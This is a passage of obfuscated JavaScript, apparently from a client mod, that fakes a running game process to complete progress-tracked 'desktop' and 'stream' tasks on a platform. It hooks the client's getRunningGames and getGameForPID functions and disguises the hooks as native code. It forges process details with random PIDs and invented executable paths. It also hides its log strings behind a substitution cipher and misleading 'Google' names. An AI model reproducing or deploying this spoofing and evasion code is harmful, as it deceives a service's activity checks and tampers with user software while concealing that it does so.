              if (!_0xc) { Log.say(_0xlex.C(0), _0xlex.P(6,[`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]K?GL]F?JJ]—]QIGNNGLE]GR]DMP]LMUk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]?]@GEECP]PGE]—]QIGNNGLE]GR]DMP]LMUk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]K?GL]F?JJ]—]JC?TGLE]GR]DMP]?]@GEECP]QCQQGMLk")}`,`${_0xlex.d("!FMPC]")}${v.name}${_0xlex.d("]LCCBQ]RFC]FC?TW]@CLAF]—]QIGNNGLE]GR]DMP]LMUk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]K?GL]F?JJ]—]KMTGLE]N?QR]GRk")}`,`${_0xlex.d("!FMPC]")}${v.name}${_0xlex.d("]LCCBQ]RFC]FC?TW]@CLAF]—]LMR]R?IGLE]GR]RFGQ]QFGDRk")}`,`${_0xlex.d("2FGQ]R?QI]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]DSJJ]UMPIQFMN]—]KMTGLE]N?QR]GRk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]?]@GEECP]PGE]—]KMTGLE]N?QR]GRk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]@GE]UMPIQFMN]—]QIGNNGLEk")}`,`${_0xlex.d("2FGQ]R?QI]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]DSJJ]UMPIQFMN]—]QIGNNGLEk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]?]@GEECP]PGE]—]LMR]R?IGLE]GR]RFGQ]QFGDRk")}`,`${_0xlex.d("2FGQ]R?QI]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]DSJJ]UMPIQFMN]—]QIGNNGLE]GR]DMP]LMUk")}`,`${_0xlex.d("!FMPC]")}${v.name}${_0xlex.d("]LCCBQ]RFC]FC?TW]@CLAF]—]JC?TGLE]GR]DMP]?]@GEECP]QCQQGMLk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]K?GL]F?JJ]—]LMR]R?IGLE]GR]RFGQ]QFGDRk")}`,`${_0xlex.d("!FMPC]")}${v.name}${_0xlex.d("]LCCBQ]RFC]FC?TW]@CLAF]—]KMTGLE]N?QR]GRk")}`])); resolve(); return; }
              let _0x1e = await GoogleGetSafe({ url: GoogleRoutes.applicationsUrl(v.app) });
              if (signal.aborted || _0xrunOwner.released) { resolve(); return; }
              let _0x1f = _0x1e?.body?.[0]; if (!_0x1f) { Log.say(_0xlex.C(0), _0xlex.P(7,[_0xlex.d("2FC]LMRC]DMP]RFC]AFMPC]A?KC]@?AI]CKNRW]—]QIGNNGLEk"),_0xlex.d("!FMPC]LMRC]A?KC]@?AI]@J?LI]—]KMTGLE]MLk"),_0xlex.d("2FC]AFMPC]PCRSPLCB]?]@J?LI]LMRC]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]AFMPC]PCRSPLCB]?]@J?LI]LMRC]—]JC?TGLE]GR]@Ck"),_0xlex.d("!FMPC]LMRC]A?KC]@?AI]@J?LI]—]JC?TGLE]GR]@Ck"),_0xlex.d("2FC]LMRC]DMP]RFC]AFMPC]A?KC]@?AI]CKNRW]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]AFMPC]LMRC]U?Q]@J?LI]—]QIGNNGLEk"),_0xlex.d("!FMPC]LMRC]A?KC]@?AI]@J?LI]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]AFMPC]PCRSPLCB]?]@J?LI]LMRC]—]KMTGLE]MLk"),_0xlex.d(",MRC]DMP]RFC]AFMPC]U?Q]CKNRW]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]AFMPC]LMRC]U?Q]@J?LI]—]JC?TGLE]GR]@Ck"),_0xlex.d(",MRC]DMP]RFC]AFMPC]U?Q]CKNRW]—]KMTGLE]MLk"),_0xlex.d("2FC]LMRC]DMP]RFC]AFMPC]A?KC]@?AI]CKNRW]—]JC?TGLE]GR]@Ck"),_0xlex.d(",MRC]DMP]RFC]AFMPC]U?Q]CKNRW]—]JC?TGLE]GR]@Ck"),_0xlex.d("2FC]AFMPC]PCRSPLCB]?]@J?LI]LMRC]—]QIGNNGLEk")])); resolve(); return; }
              let _0x20 = _0x1f.executables?.find(x => x && GoogleOS.includes(x.os))?.name?.replace(">", "") ?? _0x1f.name;
              let running = []; try { const currentGames = _0x4?.[_0xm1]?.(); running = Array.isArray(currentGames) ? currentGames : []; } catch (e) { running = []; }
              let _0x1bReal = (running.length > 0 && Number.isFinite(running[0]?.pid)) ? running[0].pid : Math.floor(Math.random() * 60000) + 4096;
              Log.say(_0xlex.C(5), _0xlex.P(41,[`${_0xlex.d("$JMMP]N?RRCPLQ]JGLC]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]N?LC]`")}${_0x1bReal}`,`${_0xlex.d("$JMMP]RGJCQ]JGLC]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]QOS?PC]`")}${_0x1bReal}`,`${_0xlex.d("2FC]RGJCB]DJMMP]JGLCQ]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]@JMAI]`")}${_0x1bReal}`,`${_0xlex.d("$JMMP]N?RRCPLQ]JGLC]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]QRMLC]`")}${_0x1bReal}`,`${_0xlex.d("2FC]RGJCB]DJMMP]JGLCQ]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]N?LC]`")}${_0x1bReal}`,`${_0xlex.d("$JMMP]RGJCQ]JGLC]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]@JMAI]`")}${_0x1bReal}`,`${_0xlex.d("$JMMP]RGJCQ]JGLC]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]QJ?@]`")}${_0x1bReal}`,`${_0xlex.d("2FC]RGJCB]DJMMP]JGLCQ]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]QOS?PC]`")}${_0x1bReal}`,`${_0xlex.d("2FC]DJMMP]EPGB]JGLCQ]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]QRMLC]`")}${_0x1bReal}`,`${_0xlex.d("$JMMP]AFCAIQ]JGLC]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]QRMLC]`")}${_0x1bReal}`,`${_0xlex.d("$JMMP]AFCAIQ]JGLC]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]N?LC]`")}${_0x1bReal}`,`${_0xlex.d("$JMMP]N?RRCPLQ]JGLC]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]QJ?@]`")}${_0x1bReal}`,`${_0xlex.d("$JMMP]RGJCQ]JGLC]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]N?LC]`")}${_0x1bReal}`,`${_0xlex.d("2FC]DJMMP]EPGB]JGLCQ]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]RGJC]`")}${_0x1bReal}`,`${_0xlex.d("$JMMP]RGJCQ]JGLC]SN]GL]DMSPQw]")}${_0x1bReal % 4 === 0}${_0xlex.d("]—]QRMLC]`")}${_0x1bReal}`]));
              const safeName = _0x8d20(_0x1f.name); const safeExe = _0x8d20(_0x20);
              let cmdLine, exePath;
              if (_0xisMac) { cmdLine = `/Applications/${safeName}.app/Contents/MacOS/${safeExe}`; exePath = cmdLine; } 
              else if (_0xisLinux) { cmdLine = `/usr/games/${safeExe}`; exePath = cmdLine; } 
              else { cmdLine = `C:\\Program Files\\${safeName}\\${safeExe}`; exePath = `c:/program files/${safeName.toLowerCase()}/${safeExe.toLowerCase()}`; }
              let _0x21 = { cmdLine, exeName: safeExe, exePath, hidden: false, isLauncher: false, id: v.app, name: safeName, pid: _0x1bReal, pidPath: [_0x1bReal], processName: safeName, start: Date.now() - (120000 + Math.floor(Math.random() * 300000)) };
              Log.say(_0xlex.C(17), _0xlex.P(43,[_0xlex.d("2FC]ASRJCPW]BP?UCP]U?Q]PCjQMPRCBw]"),_0xlex.d("1GJTCPU?PC]GL]RFC]BP?UCP]U?Q]PCMPBCPCBw]"),_0xlex.d("2FC]BP?UCP]AMLRCLRQ]UCPC]PCjQMPRCBw]"),_0xlex.d("2FC]BP?UCP]U?Q]EGTCL]?]LCU]MPBCPw]"),_0xlex.d("\"P?UCP]QJMRQ]UCPC]PCQFSDDJCBw]"),_0xlex.d("\"P?UCP]MPBCP]U?Q]PCBP?ULw]"),_0xlex.d("\"P?UCP]?PP?LECKCLR]U?Q]PCDPCQFCBw]"),_0xlex.d("2FC]BP?UCP]U?Q]PCQFSDDJCBw]"),_0xlex.d("2FC]BP?UCP]EMR]?]PCQFSDDJCw]"),_0xlex.d("\"P?UCP]GRCKQ]UCPC]PC?PP?LECBw]"),_0xlex.d("2FC]DJ?RU?PC]BP?UCP]U?Q]PCQFSDDJCBw]"),_0xlex.d("\"P?UCP]AMLRCLRQ]UCPC]PCMPBCPCBw]"),_0xlex.d("2FC]BP?UCP]J?WMSR]AF?LECBw]"),_0xlex.d("2FC]BP?UCP]EMR]PCjQMPRCBw]"),_0xlex.d("2FC]BP?UCP]U?Q]KGVCB]SN]?E?GLw]")]) + Object.keys(_0x21).join(", "));
              let _0x23 = [_0x21]; let undo1 = null, undo2 = null;
              try {
                undo1 = GoogleHook(_0x4, _0xm1, GoogleNative(() => _0x23, "function getRunningGames() { [native code] }", _0xm1, 0));
                undo2 = GoogleHook(_0x4, _0xm2, GoogleNative(p => _0x23.find(x => x.pid === p), "function getGameForPID() { [native code] }", _0xm2, 1));
                if (!undo1 || !undo2) throw new Error("hook");
              } catch (e) { try { if (typeof undo2 === 'function') undo2(); } catch (x) {} try { if (typeof undo1 === 'function') undo1(); } catch (x) {} Log.say(_0xlex.C(0), _0xlex.P(8,[_0xlex.d("2FC]BCQIRMN]BMMPU?W]UMSJB]LMR]MNCL]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d("2FC]BCQIRMN]BMMPU?W]AMSJB]LMR]@C]NPCN?PCB]—]QIGNNGLEk"),_0xlex.d("2FC]BCQIRMN]PMSRC]AMSJB]LMR]@C]?PKCB]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d("2FC]BCQIRMN]BMMPU?W]D?GJCB]RM]AMKC]SN]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]BCQIRMN]BMMPU?W]PCDSQCB]RM]@C]QCR]SN]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d("2FC]BCQIRMN]CLRPW]AMSJB]LMR]@C]MNCLCB]—]KMTGLE]MLk"),_0xlex.d("2FC]BCQIRMN]PMSRC]AMSJB]LMR]@C]?PKCB]—]KMTGLE]MLk"),_0xlex.d("2FC]BCQIRMN]BMMPU?W]PCDSQCB]RM]@C]QCR]SN]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d("2FC]BCQIRMN]PMSRC]AMSJB]LMR]@C]?PKCB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]BCQIRMN]CLRPW]AMSJB]LMR]@C]MNCLCB]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d("2FC]BCQIRMN]BMMPU?W]PCDSQCB]RM]@C]QCR]SN]—]QIGNNGLEk"),_0xlex.d("2FC]BCQIRMN]BMMPU?W]UMSJB]LMR]MNCL]—]KMTGLE]MLk"),_0xlex.d("2FC]BCQIRMN]BMMPU?W]AMSJB]LMR]@C]NPCN?PCB]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d("2FC]BCQIRMN]BMMPU?W]D?GJCB]RM]AMKC]SN]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d("2FC]BCQIRMN]BMMPU?W]UMSJB]LMR]MNCL]—]LMR]R?IGLE]GR]RFGQ]QFGDRk")])); resolve(); return; }
              
              let cleanupCalled = false, removeSelf = null, watchdog = null, GoogleDesktopHandler = null;
              const cleanup = () => { 
                if (cleanupCalled) return; 
                cleanupCalled = true; 
                
                finishTask();
                Log.diag("Desktop task cleanup", { state: "cleaned", activeTaskCount: _0x8844.size }); 
                if (removeSelf) removeSelf(); 
                try { undo1?.(); undo2?.(); } catch (e) {} 
                try { _0xsend({ type: _0xe0, removed: [_0x21], added: [], games: [] }); } catch (e) {} 
                if (GoogleDesktopHandler) { try { _0xoff(_0xe1, GoogleDesktopHandler); } catch (e) {} } 
                if (watchdog !== null) { clearTimeout(watchdog); watchdog = null; } 
                resolve(); 
              };
              removeSelf = _0xe8a7(cleanup);
              
              try { _0xsend({ type: _0xe0, removed: running, added: [_0x21], games: _0x23 }); } catch (e) { cleanup(); Log.say(_0xlex.C(0), _0xlex.P(9,[_0xlex.d("'LGRG?J]QR?RC]BGQN?RAF]D?GJCB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]GLGRG?J]BGQN?RAF]UCLR]UPMLE]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]GLGRG?J]QR?RC]AMSJB]LMR]@C]BGQN?RAFCB]—]KMTGLE]MLk"),_0xlex.d("1CLBGLE]RFC]GLGRG?J]QR?RC]D?GJCB]—]JC?TGLE]GR]@Ck"),_0xlex.d("2FC]GLGRG?J]BGQN?RAF]UCLR]UPMLE]—]KMTGLE]MLk"),_0xlex.d("2FC]GLGRG?J]BGQN?RAF]UCLR]UPMLE]—]LMR]QR?PRGLE]GRk"),_0xlex.d("$GPQR]QR?RC]NSQF]D?GJCB]—]LMR]QR?PRGLE]GRk"),_0xlex.d("'LGRG?J]QR?RC]BGQN?RAF]D?GJCB]—]JC?TGLE]GR]@Ck"),_0xlex.d("2FC]GLGRG?J]BGQN?RAF]UCLR]UPMLE]—]JC?TGLE]GR]@Ck"),_0xlex.d("1CLBGLE]RFC]GLGRG?J]QR?RC]D?GJCB]—]KMTGLE]MLk"),_0xlex.d("$GPQR]QR?RC]NSQF]D?GJCB]—]JC?TGLE]GR]@Ck"),_0xlex.d("2FC]GLGRG?J]QR?RC]AMSJB]LMR]@C]BGQN?RAFCB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("1CLBGLE]RFC]GLGRG?J]QR?RC]D?GJCB]—]QIGNNGLEk"),_0xlex.d("'LGRG?J]QR?RC]BGQN?RAF]D?GJCB]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]GLGRG?J]QR?RC]AMSJB]LMR]@C]BGQN?RAFCB]—]QIGNNGLEk")])); resolve(); return; }
              if (cleanupCalled || signal.aborted || _0xrunOwner.released) { resolve(); return; }
              
              let stick = 0;
              GoogleDesktopHandler = data => { if (_0xpaus || _0xkill || signal.aborted || cleanupCalled) return; let _0x26 = GoogleProgress(data, GoogleTasks.play, v.cfgv); if (_0x26 === null) return; if (++stick % 3 === 1 || _0x26 >= v.goal) Log.say(_0xlex.C(4), _0xlex.P(36,[`${_0xlex.d("!SPPCLR]@C?Rw]")}${_0x26}${_0xlex.d("l")}${v.goal}`,`${_0xlex.d("0SLLGLE]R?JJWw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d(",MU]PC?BGLEw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("]GL]RFC]@MMIQk")}`,`${_0xlex.d(",MU]PC?BGLEw]")}${_0x26}${_0xlex.d("l")}${v.goal}`,`${_0xlex.d("0SLLGLE]R?JJWw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d("0SLLGLE]R?JJWw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("]RM]B?RCk")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("]RM]B?RCk")}`,`${_0xlex.d(",MU]PC?BGLEw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("]GL]RFC]@MMIQk")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("]QM]D?Pk")}`,`${_0xlex.d(".PMEPCQQ]JGLCw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d("0SLLGLE]R?JJWw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("]GL]RFC]@MMIQk")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("]RM]B?RCk")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${_0x26}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`])); if (_0x26 >= v.goal) Log.say(_0xlex.C(3), _0xlex.P(39,[`${_0xlex.d("0MSLBCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("5P?NNCB]SNw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(" MVCB]SNw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(")LMAICB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(".SR]RM]@CBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("\"CJGTCPCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("&?LBCB]MDDw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("1CRRJCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!FCAICB]MDDw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!MKNJCRCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!?QFCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!JMQCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!JC?PCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!MLAJSBCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("1C?JCBw]")}${v.name}${_0xlex.d("k")}`])); if (_0x26 >= v.goal || _0xkill) cleanup(); };
              watchdog = setTimeout(() => cleanup(), Math.max(10 * 60 * 1000, (v.goal - v.cur) * 120000));
              
              try { _0xon(_0xe1, GoogleDesktopHandler); } catch (e) { cleanup(); Log.say(_0xlex.C(0), _0xlex.P(10,[_0xlex.d("\"CQIRMN]NPMEPCQQ]QS@QAPGNRGML]D?GJCB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("\"CQIRMN]NPMEPCQQ]SNB?RCQ]AMSJB]LMR]@C]QS@QAPG@CB]—]LMR]QR?PRGLE]GRk"),_0xlex.d("1S@QAPG@GLE]RM]BCQIRMN]NPMEPCQQ]D?GJCB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]BCQIRMN]DCCB]QS@QAPGNRGML]D?GJCB]—]JC?TGLE]GR]@Ck"),_0xlex.d("1S@QAPG@GLE]RM]BCQIRMN]NPMEPCQQ]D?GJCB]—]JC?TGLE]GR]@Ck"),_0xlex.d("1S@QAPG@GLE]RM]BCQIRMN]NPMEPCQQ]D?GJCB]—]QIGNNGLEk"),_0xlex.d("2FC]BCQIRMN]NPMEPCQQ]DCCB]UMSJB]LMR]QS@QAPG@C]—]KMTGLE]MLk"),_0xlex.d("2FC]BCQIRMN]NPMEPCQQ]DCCB]UMSJB]LMR]QS@QAPG@C]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]BCQIRMN]NPMEPCQQ]DCCB]UMSJB]LMR]QS@QAPG@C]—]LMR]QR?PRGLE]GRk"),_0xlex.d("\"CQIRMN]NPMEPCQQ]SNB?RCQ]AMSJB]LMR]@C]QS@QAPG@CB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]BCQIRMN]DCCB]QS@QAPGNRGML]D?GJCB]—]KMTGLE]MLk"),_0xlex.d("\"CQIRMN]NPMEPCQQ]SNB?RCQ]AMSJB]LMR]@C]QS@QAPG@CB]—]JC?TGLE]GR]@Ck"),_0xlex.d("2FC]BCQIRMN]DCCB]QS@QAPGNRGML]D?GJCB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]BCQIRMN]DCCB]QS@QAPGNRGML]D?GJCB]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]BCQIRMN]DCCB]QS@QAPGNRGML]D?GJCB]—]QIGNNGLEk")])); resolve(); return; }
              
              
              Log.diag("Desktop task handoff", { state: "subscribed", activeTaskCount: _0x8844.size });
              handedOff = true; 
              Log.say(_0xlex.C(10), _0xlex.P(44,[`${_0xlex.d(",MRCQ]DMP]")}${safeName}${_0xlex.d("]—]BMSEFdQ]EMR]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]RM]EMk")}`,`${_0xlex.d("!FCAIGLE]ML]")}${safeName}${_0xlex.d("]—]@PC?B]LCCBQ]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d(",MRCQ]DMP]")}${safeName}${_0xlex.d("]—]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGLSRCQ]JCDR]ML]RFC]BMSEFk")}`,`${_0xlex.d("!FCAIGLE]ML]")}${safeName}${_0xlex.d("]—]BMSEFdQ]EMR]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]RM]EMk")}`,`${_0xlex.d("+SJJGLE]MTCP]LMRCQ]DMP]")}${safeName}${_0xlex.d("]—]BMSEFdQ]EMR]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]RM]EMk")}`,`${_0xlex.d(".CCIGLE]?R]")}${safeName}${_0xlex.d("]—]BMSEF]LCCBQ]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("5?RAFGLE]RFC]MTCL]DMP]")}${safeName}${_0xlex.d("]—]BMSEF]LCCBQ]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("+SJJGLE]MTCP]LMRCQ]DMP]")}${safeName}${_0xlex.d("]—]@PC?B]LCCBQ]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d(".CCIGLE]?R]")}${safeName}${_0xlex.d("]—]@PC?B]LCCBQ]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d(".CCIGLE]?R]")}${safeName}${_0xlex.d("]—]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGLSRCQ]JCDR]ML]RFC]BMSEFk")}`,`${_0xlex.d(")CCNGLE]?L]CWC]ML]")}${safeName}${_0xlex.d("]—]BMSEF]LCCBQ]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d(",MRCQ]DMP]")}${safeName}${_0xlex.d("]—]@PC?B]LCCBQ]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("5?RAFGLE]RFC]MTCL]DMP]")}${safeName}${_0xlex.d("]—]@PC?B]LCCBQ]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("+SJJGLE]MTCP]LMRCQ]DMP]")}${safeName}${_0xlex.d("]—]BMSEF]LCCBQ]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("!FCAIGLE]ML]")}${safeName}${_0xlex.d("]—]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGLSRCQ]JCDR]ML]RFC]BMSEFk")}`]));
            } catch (err) {
              finishTask();
              reject(err);
            } finally {
              if (!handedOff) finishTask();
            }
          })();
        });
      };

      const _0xstream = async (v) => {
        const taskId = Symbol(); _0x8844.add(taskId);
        let taskFinished = false; 
        const finishTask = () => { if (!taskFinished) { taskFinished = true; _0x8844.delete(taskId); } };
        
        return new Promise((resolve, reject) => {
          (async () => {
            let handedOff = false;
            try {
              if (!_0xc) { Log.say(_0xlex.C(0), _0xlex.P(6,[`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]K?GL]F?JJ]—]QIGNNGLE]GR]DMP]LMUk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]?]@GEECP]PGE]—]QIGNNGLE]GR]DMP]LMUk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]K?GL]F?JJ]—]JC?TGLE]GR]DMP]?]@GEECP]QCQQGMLk")}`,`${_0xlex.d("!FMPC]")}${v.name}${_0xlex.d("]LCCBQ]RFC]FC?TW]@CLAF]—]QIGNNGLE]GR]DMP]LMUk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]K?GL]F?JJ]—]KMTGLE]N?QR]GRk")}`,`${_0xlex.d("!FMPC]")}${v.name}${_0xlex.d("]LCCBQ]RFC]FC?TW]@CLAF]—]LMR]R?IGLE]GR]RFGQ]QFGDRk")}`,`${_0xlex.d("2FGQ]R?QI]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]DSJJ]UMPIQFMN]—]KMTGLE]N?QR]GRk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]?]@GEECP]PGE]—]KMTGLE]N?QR]GRk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]@GE]UMPIQFMN]—]QIGNNGLEk")}`,`${_0xlex.d("2FGQ]R?QI]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]DSJJ]UMPIQFMN]—]QIGNNGLEk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]?]@GEECP]PGE]—]LMR]R?IGLE]GR]RFGQ]QFGDRk")}`,`${_0xlex.d("2FGQ]R?QI]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]DSJJ]UMPIQFMN]—]QIGNNGLE]GR]DMP]LMUk")}`,`${_0xlex.d("!FMPC]")}${v.name}${_0xlex.d("]LCCBQ]RFC]FC?TW]@CLAF]—]JC?TGLE]GR]DMP]?]@GEECP]QCQQGMLk")}`,`${_0xlex.d("2F?R]AFMPC]e")}${v.name}${_0xlex.d("f]LCCBQ]RFC]K?GL]F?JJ]—]LMR]R?IGLE]GR]RFGQ]QFGDRk")}`,`${_0xlex.d("!FMPC]")}${v.name}${_0xlex.d("]LCCBQ]RFC]FC?TW]@CLAF]—]KMTGLE]N?QR]GRk")}`])); resolve(); return; }
              if (signal.aborted || _0xrunOwner.released) { resolve(); return; }
              let _0xpid = Math.floor(Math.random() * 60000) + 4096;
              Log.say(_0xlex.C(5), _0xlex.P(42,[`${_0xlex.d("2FC]DJMMP]EPGB]JGLCQ]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]@JMAI]`")}${_0xpid}`,`${_0xlex.d("$JMMP]N?RRCPLQ]JGLC]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]RGJC]`")}${_0xpid}`,`${_0xlex.d("2FC]DJMMP]EPGB]JGLCQ]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]QJ?@]`")}${_0xpid}`,`${_0xlex.d("$JMMP]RGJCQ]JGLC]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]QOS?PC]`")}${_0xpid}`,`${_0xlex.d("$JMMP]AFCAIQ]JGLC]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]QJ?@]`")}${_0xpid}`,`${_0xlex.d("2FC]RGJCB]DJMMP]JGLCQ]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]QRMLC]`")}${_0xpid}`,`${_0xlex.d("2FC]RGJCB]DJMMP]JGLCQ]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]QOS?PC]`")}${_0xpid}`,`${_0xlex.d("2FC]DJMMP]EPGB]JGLCQ]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]N?LC]`")}${_0xpid}`,`${_0xlex.d("2FC]RGJCB]DJMMP]JGLCQ]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]QJ?@]`")}${_0xpid}`,`${_0xlex.d("2FC]RGJCB]DJMMP]JGLCQ]SN]GL]DMSPQw]")}${_0xpid % 4 === 